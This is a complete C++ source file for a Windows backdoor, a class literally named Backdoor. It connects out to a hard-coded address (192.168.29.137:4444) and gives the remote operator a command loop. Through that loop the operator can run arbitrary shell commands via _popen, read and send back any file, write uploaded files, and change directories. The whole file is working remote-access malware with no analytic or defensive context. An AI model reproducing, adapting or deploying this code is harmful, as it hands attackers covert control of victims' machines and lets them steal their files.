#include <iostream>
#include <string>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <windows.h>
#include <fstream>
#include <stdexcept>

#pragma comment(lib, "ws2_32.lib")

class Backdoor {
private:
    SOCKET connection;

public:
    Backdoor(const char* ip, int port) {
        WSADATA wsData;
        WORD ver = MAKEWORD(2, 2);
        int wsOk = WSAStartup(ver, &wsData);
        if (wsOk != 0) {
            throw std::runtime_error("Can't initialize Winsock! Quitting");
        }
        connection = socket(AF_INET, SOCK_STREAM, 0);
        if (connection == INVALID_SOCKET) {
            throw std::runtime_error("Can't create socket! Quitting");
        }
        sockaddr_in hint;
        hint.sin_family = AF_INET;
        hint.sin_port = htons(port);
        hint.sin_addr.s_addr = inet_addr(ip);
        if (hint.sin_addr.s_addr == INADDR_NONE) {
            throw std::runtime_error("Invalid address! Quitting");
        }
        int connResult = connect(connection, (sockaddr*)&hint, sizeof(hint));
        if (connResult == SOCKET_ERROR) {
            throw std::runtime_error("Can't connect to server! Quitting");
        }
    }

    ~Backdoor() {
        closesocket(connection);
        WSACleanup();
    }

    void safeSend(const std::string& data) {
        send(connection, data.c_str(), data.size(), 0);
    }

    std::string safeReceive() {
        char buf[4096];
        int bytesReceived = recv(connection, buf, 4096, 0);
        if (bytesReceived == SOCKET_ERROR) {
            throw std::runtime_error("Error in receiving data! Quitting");
        }
        return std::string(buf, bytesReceived);
    }

    void run() {
        while (true) {
            std::string command = safeReceive();
            try {
                if (command == "exit") {
                    closesocket(connection);
                    WSACleanup();
                    exit(0);
                }
                else if (command.substr(0, 2) == "cd" && command.size() > 3) {
                    std::string path = command.substr(3);
                    std::string commandResult = changePath(path);
                    safeSend(commandResult);
                }
                else if (command.substr(0, 8) == "download") {
                    std::string filename = command.substr(9);
                    std::string commandResult = readFile(filename);
                    safeSend(commandResult);
                }
                else if (command.substr(0, 6) == "upload") {
                    size_t delimPos = command.find(" ");
                    std::string filename = command.substr(7, delimPos - 7);
                    std::string content = command.substr(delimPos + 1);
                    std::string commandResult = writeFile(filename, content);
                    safeSend(commandResult);
                }
                else {
                    std::string commandResult = executeCommands(command);
                    safeSend(commandResult);
                }
            }
            catch (const std::exception& e) {
                safeSend("[-] There is an error on the command");
            }
        }
    }

    std::string changePath(const std::string& path) {
        if (SetCurrentDirectoryA(path.c_str()))
            return "[+] Change path to " + path;
        else
            return "[-] Failed to change path";
    }

    std::string writeFile(const std::string& path, const std::string& content) {
        std::ofstream file(path, std::ios::out | std::ios::binary);
        if (!file.is_open()) {
            return "[-] Failed to upload file";
        }
        file << content;
        file.close();
        return "[+] Upload was Successful";
    }

    std::string readFile(const std::string& path) {
        std::ifstream file(path, std::ios::in | std::ios::binary);
        if (!file.is_open()) {
            return "[-] Failed to read file";
        }
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        return content;
    }

    std::string executeCommands(const std::string& command) {
        std::string result;
        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            return "[-] Failed to execute command";
        }
        char buffer[128];
        while (fgets(buffer, 128, pipe) != NULL) {
            result += buffer;
        }
        _pclose(pipe);
        return result;
    }
};

int main() {
    try {
        Backdoor myBackdoor("192.168.29.137", 4444);
        myBackdoor.run();
    }
    catch (const std::exception& e) {
        std::cerr << e.what() << std::endl;
    }
    return 0;
}
